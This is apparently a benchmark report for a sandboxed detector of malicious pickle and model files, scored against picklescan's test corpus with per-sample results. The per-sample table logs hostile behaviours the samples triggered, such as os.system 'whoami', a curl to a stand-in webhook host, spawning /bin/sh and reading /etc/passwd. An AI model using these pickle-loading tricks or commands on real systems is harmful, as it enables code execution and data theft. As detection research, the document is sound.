# Third-party malicious corpus — picklescan's own test data

Source: picklescan's published test corpus (`github.com/mmaitre314/picklescan`), **91 malicious and 4 benign samples**. These are not ours, and some are derived from real GHSA advisories in real libraries.

| measure | result |
|---|---|
| our contained run **observed capability** on malicious samples | **43/91** |
| our contained run observed capability on **benign** samples (false positives) | **0/4** |
| picklescan called the malicious samples infected | **88/91** |
| picklescan called the benign samples infected | **0/4** |

## Malicious samples our box did **not** observe

- `bad_pytorch.pt`
- `malicious1.7z`
- `malicious1.zip`
- `malicious10.pkl`
- `malicious13b.pkl`
- `malicious14.pkl`
- `malicious17.pkl`
- `malicious1_0x1.zip`
- `malicious1_0x20.zip`
- `malicious1_0x40.zip`
- `malicious1_central_directory.zip`
- `malicious1_v0.pkl`
- `malicious1_wrong_ext.zip`
- `malicious4.pickle`
- `malicious5.pickle`
- `malicious6.pkl`
- `malicious9.pkl`
- `GHSA-3gf5-cxq9-w223.pkl`
- `GHSA-3vg9-h568-4w9m.pkl`
- `GHSA-4r9r-ch6f-vxmx.pkl`
- `GHSA-4whj-rm5r-c2v8.pkl`
- `GHSA-6vqj-c2q5-j97w.pkl`
- `GHSA-6w4w-5w54-rjvr.pkl`
- `GHSA-7cq8-mj8x-j263.pkl`
- `GHSA-86cj-95qr-2p4f.pkl`
- `GHSA-8r4j-24qv-fmq9.pkl`
- `GHSA-9xph-j2h6-g47v.pkl`
- `GHSA-cj3c-v495-4xqh.pkl`
- `GHSA-f4x7-rfwp-v3xw.pkl`
- `GHSA-f54q-57x4-jg88.pkl`
- `GHSA-g344-hcph-8vgg.pkl`
- `GHSA-g38g-8gr9-h9xp-pyrepl-pager.pkl`
- `GHSA-g38g-8gr9-h9xp-test.pkl`
- `GHSA-h3qp-7fh3-f8h4.pkl`
- `GHSA-j343-8v2j-ff7w.pkl`
- `GHSA-jhph-76pp-mggw.pkl`
- `GHSA-m273-6v24-x4m4.pkl`
- `GHSA-m869-42cg-3xwr.pkl`
- `GHSA-p9w7-82w4-7q8m.pkl`
- `GHSA-r8g5-cgf2-4m4m.pkl`
- `GHSA-vr7h-p6mm-wpmh.pkl`
- `GHSA-vv6j-3g6g-2pvj.pkl`
- `GHSA-vvpj-8cmc-gx39.pkl`
- `cloudpickle_codeinjection.pkl`
- `dns_exfiltration.npy`
- `malicious1_crc.zip`
- `malicious22.pkl`
- `types_CodeType.pkl`

## Per sample

| sample | truth | observed | picklescan | first capability seen |
|---|---|---|---|---|
| `bad_pytorch.pt` | malicious | no | clean | - |
| `benign0_v0.pkl` | benign | no | clean | - |
| `benign0_v3.pkl` | benign | no | clean | - |
| `benign0_v4.pkl` | benign | no | clean | - |
| `benign_password_protected.zip` | benign | no | clean | - |
| `broken_model.pkl` | unlabelled | **yes** | infected | pickle.find_class: builtins.exec |
| `malicious-invalid-bytes.pkl` | malicious | **yes** | infected | pickle.find_class: os.system |
| `malicious0.pkl` | malicious | **yes** | infected | file.read: /etc/passwd |
| `malicious1.7z` | malicious | no | clean | - |
| `malicious1.zip` | malicious | no | infected | - |
| `malicious10.pkl` | malicious | no | infected | - |
| `malicious11.pkl` | malicious | **yes** | infected | pickle.find_class: os.system |
| `malicious12.pkl` | malicious | **yes** | infected | pickle.find_class: builtins.__import__ |
| `malicious13a.pkl` | malicious | **yes** | infected | pickle.find_class: pickle.loads |
| `malicious13b.pkl` | malicious | no | infected | - |
| `malicious14.pkl` | malicious | no | infected | - |
| `malicious15a.pkl` | malicious | **yes** | infected | os.system: b'whoami' |
| `malicious15b.pkl` | malicious | **yes** | infected | pickle.find_class: bdb.Bdb.run |
| `malicious16.pkl` | malicious | **yes** | infected | socket.bind: <socket.socket fd=4, family=10, type=1, |
| `malicious17.pkl` | malicious | no | infected | - |
| `malicious18.pkl` | malicious | **yes** | infected | file.read: 5 |
| `malicious19.pkl` | malicious | **yes** | infected | pickle.find_class: torch.serialization.load |
| `malicious1_0x1.zip` | malicious | no | infected | - |
| `malicious1_0x20.zip` | malicious | no | infected | - |
| `malicious1_0x40.zip` | malicious | no | infected | - |
| `malicious1_central_directory.zip` | malicious | no | infected | - |
| `malicious1_v0.pkl` | malicious | no | infected | - |
| `malicious1_v3.pkl` | malicious | **yes** | infected | pickle.find_class: builtins.eval |
| `malicious1_v4.pkl` | malicious | **yes** | infected | pickle.find_class: builtins.eval |
| `malicious1_wrong_ext.zip` | malicious | no | infected | - |
| `malicious20.pkl` | malicious | **yes** | infected | os.mkdir: /work/venv |
| `malicious2_v0.pkl` | malicious | **yes** | infected | pickle.find_class: posix.system |
| `malicious2_v3.pkl` | malicious | **yes** | infected | pickle.find_class: posix.system |
| `malicious2_v4.pkl` | malicious | **yes** | infected | pickle.find_class: posix.system |
| `malicious3.pkl` | malicious | **yes** | infected | pickle.find_class: httplib.HTTPSConnection |
| `malicious4.pickle` | malicious | no | infected | - |
| `malicious5.pickle` | malicious | no | infected | - |
| `malicious6.pkl` | malicious | no | infected | - |
| `malicious7.pkl` | malicious | **yes** | infected | pickle.find_class: socket.create_connection |
| `malicious8.pkl` | malicious | **yes** | infected | pickle.find_class: subprocess.run |
| `malicious9.pkl` | malicious | no | infected | - |
| `new_pytorch_model.bin` | unlabelled | no | clean | - |
| `not_a_pickle.bin` | unlabelled | no | clean | - |
| `pytorch_magic_bypass.pt` | unlabelled | no | infected | - |
| `pytorch_model.bin` | unlabelled | no | clean | - |
| `sys_module_override_sploit.pkl` | unlabelled | no | infected | - |
| `GHSA-3gf5-cxq9-w223.pkl` | malicious | no | infected | - |
| `GHSA-3vg9-h568-4w9m.pkl` | malicious | no | infected | - |
| `GHSA-4675-36f9-wf6r.pkl` | malicious | **yes** | infected | ctypes.dlopen: None |
| `GHSA-46h3-79wf-xr6c.pkl` | malicious | **yes** | infected | pickle.find_class: builtins.__import__ |
| `GHSA-49gj-c84q-6qm9.pkl` | malicious | **yes** | infected | pickle.find_class: cProfile.run |
| `GHSA-4r9r-ch6f-vxmx.pkl` | malicious | no | infected | - |
| `GHSA-4whj-rm5r-c2v8.pkl` | malicious | no | infected | - |
| `GHSA-5qwp-399c-mjwf.pkl` | malicious | **yes** | infected | pickle.find_class: trace.Trace.run |
| `GHSA-6vqj-c2q5-j97w.pkl` | malicious | no | infected | - |
| `GHSA-6w4w-5w54-rjvr.pkl` | malicious | no | infected | - |
| `GHSA-7cq8-mj8x-j263.pkl` | malicious | no | infected | - |
| `GHSA-7wx9-6375-f5wh.pkl` | malicious | **yes** | infected | pickle.find_class: profile.run |
| `GHSA-84r2-jw7c-4r5q.pkl` | malicious | **yes** | infected | os.system: b'echo pwned' |
| `GHSA-86cj-95qr-2p4f.pkl` | malicious | no | infected | - |
| `GHSA-8r4j-24qv-fmq9.pkl` | malicious | no | infected | - |
| `GHSA-955r-x9j8-7rhh.pkl` | malicious | **yes** | infected | pickle.find_class: builtins.__import__ |
| `GHSA-9w88-8rmg-7g2p.pkl` | malicious | **yes** | infected | os.system: b'whoami' |
| `GHSA-9xph-j2h6-g47v.pkl` | malicious | no | infected | - |
| `GHSA-cj3c-v495-4xqh.pkl` | malicious | no | infected | - |
| `GHSA-f4x7-rfwp-v3xw.pkl` | malicious | no | infected | - |
| `GHSA-f54q-57x4-jg88.pkl` | malicious | no | infected | - |
| `GHSA-f745-w6jp-hpxx.pkl` | malicious | **yes** | infected | pickle.find_class: torch.utils.collect_env.run |
| `GHSA-fqq6-7vqf-w3fg.pkl` | malicious | **yes** | infected | os.system: b'whoami' |
| `GHSA-g344-hcph-8vgg.pkl` | malicious | no | infected | - |
| `GHSA-g38g-8gr9-h9xp-aix-support.pkl` | malicious | **yes** | infected | os.system: b"id 2>/dev/null >'/tmp/_aix_support.1'" |
| `GHSA-g38g-8gr9-h9xp-imaplib.pkl` | malicious | **yes** | infected | file.read: 5 |
| `GHSA-g38g-8gr9-h9xp-osx-support.pkl` | malicious | **yes** | infected | os.remove: /tmp/_gwbnbly |
| `GHSA-g38g-8gr9-h9xp-pyrepl-pager.pkl` | malicious | no | infected | - |
| `GHSA-g38g-8gr9-h9xp-test.pkl` | malicious | no | infected | - |
| `GHSA-g38g-8gr9-h9xp-uuid.pkl` | malicious | **yes** | infected | file.read: 4 |
| `GHSA-h3qp-7fh3-f8h4.pkl` | malicious | no | infected | - |
| `GHSA-j343-8v2j-ff7w.pkl` | malicious | no | infected | - |
| `GHSA-jgw4-cr84-mqxg.bin` | malicious | **yes** | infected | subprocess.Popen: /bin/sh |
| `GHSA-jhph-76pp-mggw.pkl` | malicious | no | infected | - |
| `GHSA-m273-6v24-x4m4.pkl` | malicious | no | infected | - |
| `GHSA-m869-42cg-3xwr.pkl` | malicious | no | infected | - |
| `GHSA-p9w7-82w4-7q8m.pkl` | malicious | no | infected | - |
| `GHSA-q77w-mwjj-7mqx.pkl` | malicious | **yes** | infected | subprocess.Popen: /bin/sh |
| `GHSA-r8g5-cgf2-4m4m.pkl` | malicious | no | infected | - |
| `GHSA-vqmv-47xg-9wpr.pkl` | malicious | **yes** | infected | pickle.find_class: pty.spawn |
| `GHSA-vr7h-p6mm-wpmh.pkl` | malicious | no | infected | - |
| `GHSA-vv6j-3g6g-2pvj.pkl` | malicious | no | infected | - |
| `GHSA-vvpj-8cmc-gx39.pkl` | malicious | no | infected | - |
| `GHSA-x696-vm39-cp64.pkl` | malicious | **yes** | infected | pickle.find_class: profile.Profile.run |
| `GHSA-xp4f-hrf8-rxw7.pkl` | malicious | **yes** | infected | subprocess.Popen: /usr/local/bin/python |
| `cloudpickle_codeinjection.pkl` | malicious | no | infected | - |
| `dns_exfiltration.npy` | malicious | no | clean | - |
| `int_array.npy` | unlabelled | no | clean | - |
| `int_arrays.npz` | unlabelled | no | clean | - |
| `int_arrays_compressed.npz` | unlabelled | no | clean | - |
| `io_FileIO.pkl` | unlabelled | **yes** | infected | file.read: /etc/hosts |
| `keyerror-exploit.pkl` | malicious | **yes** | infected | pickle.find_class: os.system |
| `logging_FileHandler.pkl` | unlabelled | **yes** | infected | file.read: /work/evil.log |
| `malicious1_crc.zip` | malicious | no | infected | - |
| `malicious21.pkl` | malicious | **yes** | infected | os.system: b'curl https://webhook.invalid/1234' |
| `malicious22.pkl` | malicious | no | infected | - |
| `malicious23.pkl` | malicious | **yes** | infected | pickle.find_class: os.system |
| `object_array.npy` | unlabelled | no | clean | - |
| `object_arrays.npz` | unlabelled | no | clean | - |
| `object_arrays_compressed.npz` | unlabelled | no | clean | - |
| `type-confusion-exploit.pkl` | malicious | **yes** | infected | pickle.find_class: os.system |
| `types_CodeType.pkl` | malicious | no | infected | - |
| `urllib_request_urlopen.pkl` | malicious | **yes** | infected | pickle.find_class: urllib.request.urlopen |

This is the observation step only: does the contained run see capability? It needs no model, and a sample we do not observe is one we could not judge from behaviour - which is exactly what the escalation path is for.
